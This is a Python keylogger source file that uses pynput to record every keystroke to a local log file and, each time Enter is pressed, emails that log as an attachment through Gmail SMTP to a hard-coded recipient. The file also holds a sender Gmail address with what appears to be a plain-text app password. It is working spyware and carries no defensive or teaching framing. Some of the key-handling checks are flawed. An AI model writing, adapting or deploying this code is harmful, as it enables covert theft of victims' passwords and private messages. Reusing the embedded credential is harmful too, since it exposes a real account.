import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from pynput.keyboard import Listener

def write_to_file(key):
    key_pressed = str(key)
    key_pressed = key_pressed.replace("'", "")
    if key_pressed == 'Key.space':
    
        if key_pressed == 'key.backspaces':
    	    key_pressed = '  '
        key_pressed = ' '
    if key_pressed == 'Key.ctrlc':
        key_pressed = ''
    if key_pressed == 'Key.shift' or key_pressed == 'Key.caps_lock':
        key_pressed = ''
    if key_pressed == 'Key.enter':
        key_pressed = "\n"
        send_email()  # Call the send_email function when Enter is pressed
    with open("log.txt", "a") as f:
        f.write(key_pressed)

def send_email():
    sender = "tanyinsobright237@gmail.com"
    recipient = "wasiemmanuela183@gmail.com"
    subject = "Keylogger Alert"
    body = "The keylogger has detected some activity. Check the log file for details."

    message = MIMEMultipart()
    message['Subject'] = subject
    message['From'] = sender
    message['To'] = recipient

    # Attach the log file as an attachment
    with open("log.txt", "rb") as f:
        attachment = MIMEApplication(f.read(), _subtype="txt")
        attachment.add_header('Content-Disposition', 'attachment', filename="log.txt")
        message.attach(attachment)

    message.attach(MIMEText(body))

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
            smtp.starttls()
            smtp.login("tanyinsobright237@gmail.com", "kpoq vsww dbnt fzfn")
            smtp.sendmail(sender, recipient, message.as_string())
        print("Email sent successfully!")
    except smtplib.SMTPException as e:
        print(f"Error sending email: {e}")

with Listener(on_press=write_to_file) as l:
    l.join()